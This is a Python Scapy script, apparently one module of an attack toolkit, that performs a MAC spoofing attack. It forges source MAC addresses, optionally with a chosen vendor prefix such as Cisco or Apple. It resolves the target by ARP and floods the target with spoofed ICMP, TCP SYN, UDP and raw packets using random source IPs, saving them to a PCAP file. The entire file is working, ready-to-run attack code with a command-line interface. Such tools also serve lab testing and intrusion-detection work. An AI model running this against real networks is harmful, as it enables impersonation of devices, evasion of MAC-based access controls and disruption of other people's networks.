"""
MAC Spoofing Attack with PCAP Capture
Various MAC address spoofing techniques with packet capture
"""

from scapy.all import Ether, IP, ICMP, TCP, UDP, sendp, RandMAC, RandIP, Raw
from scapy.all import PcapWriter
import argparse
import random
import os

def execute(args):
    """Execute MAC spoofing attack with PCAP capture"""
    print(f"[MAC Spoofing] Starting attack on interface {args.interface}")
    
    pcap_writer = None
    if args.pcap:
        pcap_path = args.pcap if args.pcap != "default" else os.path.expanduser("~/Fyodost/mac_spoofing.pcap")
        os.makedirs(os.path.dirname(pcap_path), exist_ok=True)
        pcap_writer = PcapWriter(pcap_path, append=True, sync=True)
        print(f"[MAC Spoofing] PCAP capture enabled: {pcap_path}")
    
    try:
        if args.target_mac:
            target_mac = args.target_mac
        elif args.target_ip:
            from scapy.all import ARP, Ether, srp
            arp_request = ARP(pdst=args.target_ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered = srp(arp_request_broadcast, timeout=2, verbose=False, iface=args.interface)[0]
            target_mac = answered[0][1].hwsrc if answered else "ff:ff:ff:ff:ff:ff"
        else:
            target_mac = "ff:ff:ff:ff:ff:ff"  
        
        if args.spoofed_mac:
            spoofed_mac = args.spoofed_mac
        else:
            spoofed_mac = generate_spoofed_mac(args.vendor if args.vendor else None)
        
        print(f"[MAC Spoofing] Spoofing MAC: {spoofed_mac}")
        print(f"[MAC Spoofing] Target MAC: {target_mac}")
        
        packets = generate_spoofed_packets(
            spoofed_mac, 
            target_mac, 
            args.count if args.count else 100,
            args.target_ip if args.target_ip else "192.168.1.1"
        )
        
        for i, packet in enumerate(packets):
            sendp(packet, iface=args.interface, verbose=args.verbose)
            
            if pcap_writer:
                pcap_writer.write(packet)
            
            if (i + 1) % 10 == 0: 
                print(f"[MAC Spoofing] Sent {i + 1}/{len(packets)} packets")
        
        print(f"[MAC Spoofing] Sent {len(packets)} spoofed packets")
        
        if pcap_writer:
            pcap_writer.close()
            print(f"[MAC Spoofing] PCAP file saved: {pcap_writer.filename}")
        
        return True
        
    except Exception as e:
        print(f"[MAC Spoofing] Error: {e}")
        if pcap_writer:
            pcap_writer.close()
        return False

def generate_spoofed_mac(vendor=None):
    """Generate a random MAC address, optionally with specific vendor OUI"""
    vendor_ouis = {
        "cisco": "00:00:0C",
        "hp": "00:1B:21", 
        "dell": "00:1C:B3",
        "apple": "00:03:93",
        "microsoft": "00:15:5D",
        "google": "00:1A:11",
        "random": None
    }
    
    if vendor and vendor.lower() in vendor_ouis:
        oui = vendor_ouis[vendor.lower()]
        if oui:
            nic = ":".join([f"{random.randint(0, 255):02x}" for _ in range(3)])
            return f"{oui}:{nic}"
    
    return str(RandMAC())

def generate_spoofed_packets(spoofed_mac, target_mac, count, target_ip):
    """Generate packets with spoofed MAC address"""
    packets = []
    
    for i in range(count):
        packet_type = random.choice(["icmp", "tcp", "udp", "raw"])
        
        if packet_type == "icmp":
            packet = (
                Ether(src=spoofed_mac, dst=target_mac) /
                IP(dst=target_ip, src=RandIP()) /
                ICMP() /
                f"MAC Spoofing Attack - Packet {i+1}".encode()
            )
        elif packet_type == "tcp":
            sport = random.randint(1024, 65535)
            dport = random.choice([80, 443, 22, 21, 25, 53])
            packet = (
                Ether(src=spoofed_mac, dst=target_mac) /
                IP(dst=target_ip, src=RandIP()) /
                TCP(sport=sport, dport=dport, flags="S") /
                f"TCP SYN from spoofed MAC".encode()
            )
        elif packet_type == "udp":
            sport = random.randint(1024, 65535)
            dport = random.choice([53, 67, 68, 123, 161, 162])
            packet = (
                Ether(src=spoofed_mac, dst=target_mac) /
                IP(dst=target_ip, src=RandIP()) /
                UDP(sport=sport, dport=dport) /
                f"UDP from spoofed MAC".encode()
            )
        else: 
            packet = (
                Ether(src=spoofed_mac, dst=target_mac) /
                IP(dst=target_ip, src=RandIP(), proto=255) /
                f"Raw protocol spoofed MAC packet".encode()
            )
        
        packets.append(packet)
    
    return packets

def add_arguments(parser):
    """Add MAC spoofing specific arguments to parser"""
    parser.add_argument("--spoofed-mac", help="MAC address to spoof")
    parser.add_argument("--target-mac", "-tm", help="Target MAC address")
    parser.add_argument("--target-ip", "-ti", help="Target IP address (to resolve MAC)")
    parser.add_argument("--vendor", help="Vendor for MAC OUI (cisco, hp, dell, apple, microsoft, google, random)")
    parser.add_argument("--count", "-c", type=int, default=100, 
                       help="Number of packets to send")
    parser.add_argument("--pcap", nargs="?", const="default", 
                       help="Enable PCAP capture. Specify path or use default: ~/Fyodost/mac_spoofing.pcap")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MAC Spoofing Attack with PCAP Capture")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--spoofed-mac", help="MAC address to spoof")
    parser.add_argument("--target-mac", "-tm", help="Target MAC address")
    parser.add_argument("--target-ip", "-ti", help="Target IP address (to resolve MAC)")
    parser.add_argument("--vendor", help="Vendor for MAC OUI")
    parser.add_argument("--count", "-c", type=int, default=100, 
                       help="Number of packets to send")
    parser.add_argument("--pcap", nargs="?", const="default", 
                       help="Enable PCAP capture. Specify path or use default")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[-] This script requires root privileges. Run with sudo.")
        exit(1)
    
    execute(args)